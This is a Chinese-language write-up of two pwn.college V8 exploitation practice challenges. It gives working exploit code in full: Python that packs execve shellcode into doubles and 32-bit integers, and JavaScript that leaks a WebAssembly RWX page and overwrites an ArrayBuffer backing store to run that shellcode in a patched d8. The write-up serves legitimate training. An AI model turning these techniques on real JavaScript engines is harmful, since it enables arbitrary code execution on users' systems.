# Practice-Pwncollege

https://pwn.college/quarterly-quiz/v8-exploitation 提供了一些练习，需要注册账号。每道题目都有start和practice选项，区别在于practice提供的环境可以用sudo。我刚开始没意识到这点，准备调试d8的时候提示permission denied。加个sudo就解决了

题目提供的环境自带pwndbg，不过要用`pwndbg`命令唤起，而不是`gdb`。环境的workspace和desktop是互通的，在workspace里改动的文件能在desktop里看到，反之亦然

## level1

整个patch文件都是bug，将double数组里的元素拷贝到mmap的一块rwx内存后执行。直接生成shellcode后转成double类型即可
```py
from pwn import *
import struct
context.arch='amd64'
shellcode=asm(shellcraft.execve('/challenge/catflag', 0, 0))
exp=[]
for i in range(0,len(shellcode),8):
    exp.append(struct.unpack('d', shellcode[i:i+8].ljust(8,b'\x00'))[0])
print(exp)
```
```js
let shellcode=[2.820972645905851e-134, 3.0758087950517603e+180, 2.2354425876138794e+40, 3.68572438550025e+180, 1.054512194375715e-68, 2.748715909248e-311];
shellcode.run();
```
注意shellcode要执行题目自带的`catflag`而不是sh

## level2

这回总算知道了什么是“像噩梦一样”

patch文件提供了三个函数，`GetAddressOf`,`ArbRead32`和`ArbWrite32`。`GetAddressOf`返回的是对象压缩后的指针（即相对于基地址的偏移）；`ArbRead32`和`ArbWrite32`的参数也是压缩后的指针

这题的设置很像教程Part 6里的内容，甚至更简单了一点，不需要自己制造“任意”地址读写的函数，题目已经准备好了。只需要用ArrayBuffer将压缩指针的任意地址写提升成全局任意地址写即可

……然后噩梦就开始了。我根据教程里的说法用`%DebugPrint`+while无限循环调试，捣鼓了好一会终于成功了。但是`%DebugPrint`只有开启`--allow-natives-syntax`才能用，而实战环境里是没有的，所以我得去掉这句。但是v8 pwn和平时搞的linux pwn不同，非常不稳定。只要我改动一点，比如删除某行或者添加某行代码，泄漏地址的偏移就不一样了。现在问题来了，我得用`%DebugPrint`才能知道wasm_instance的地址从而计算泄漏的偏移，但是实战环境不能用；我又没办法算没有`%DebugPrint`时的偏移。这不就卡死了？

后面想了个别的方法。用`%DebugPrint`可以得到wasm_instance的地址，而wasm_instance内含有一些特殊的字节。这些字节在脚本每次运行时都一样，无论有没有`%DebugPrint`。所以在pwndbg里对这些字节用`search -x`就能在无`%DebugPrint`的情况下找到wasm_instance的地址了

还有一点是js里的整数。`ArbRead32`一次只能读32 bit，所以想要泄漏wasm的RWX内存地址要读两次。假设上半部分叫upper，下半部分叫lower，那么完整地址是`(upper<<32)|lower`对吧（至少python里是的）？结果js里因为整数带符号，出来的结果乱七八糟。后面我尝试套了一层BigInt，把`|`换成`+`，行了。不确定这是不是最好的办法，总之能用
```js
function shift32(i) {
	return i << 32n;
}
WASM_PAGE_UPPER_OFFSET = 0x2c35c;
WASM_PAGE_LOWER_OFFSET = 0x2c358;
var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
let upper=BigInt(ArbRead32(GetAddressOf(wasm_instance)+WASM_PAGE_UPPER_OFFSET));
let lower=BigInt(ArbRead32(GetAddressOf(wasm_instance)+WASM_PAGE_LOWER_OFFSET));
let leak = shift32(upper)+lower;
console.log(leak);
var shellcode=[23486568, 607420673, 16843009, 1701296200, 1952539439, 1213230182, 1751330744, 1701604449, 2303217774, 835858919, 1480289014, 1295];
let buf = new ArrayBuffer(shellcode.length * 4);
let dataview = new DataView(buf);
let buf_addr = GetAddressOf(buf);
let backing_store_addr = buf_addr + 0x24;
ArbWrite32(backing_store_addr,Number(lower));
ArbWrite32(backing_store_addr+4,Number(upper));
for (let i = 0; i < shellcode.length; i++) {
	dataview.setUint32(4 * i, shellcode[i], true);
}
f();
```
shellcode的生成如下：
```py
from pwn import *
import struct
context.arch='amd64'
def bytes_to_int32_array(data, byte_order='little'):
    if len(data) % 4 != 0:
        raise ValueError("字节长度必须是4的倍数")
    format_char = 'I'
    if byte_order == 'little':
        fmt = f'<{len(data)//4}{format_char}'
    else:
        fmt = f'>{len(data)//4}{format_char}'
    return list(struct.unpack(fmt, data))
data = asm(shellcraft.execve('/challenge/catflag', 0, 0))
if len(data)%4!=0:
    data+=b'\x00'*(4-len(data)%4)
integers = bytes_to_int32_array(data, byte_order='little')
print(integers)
```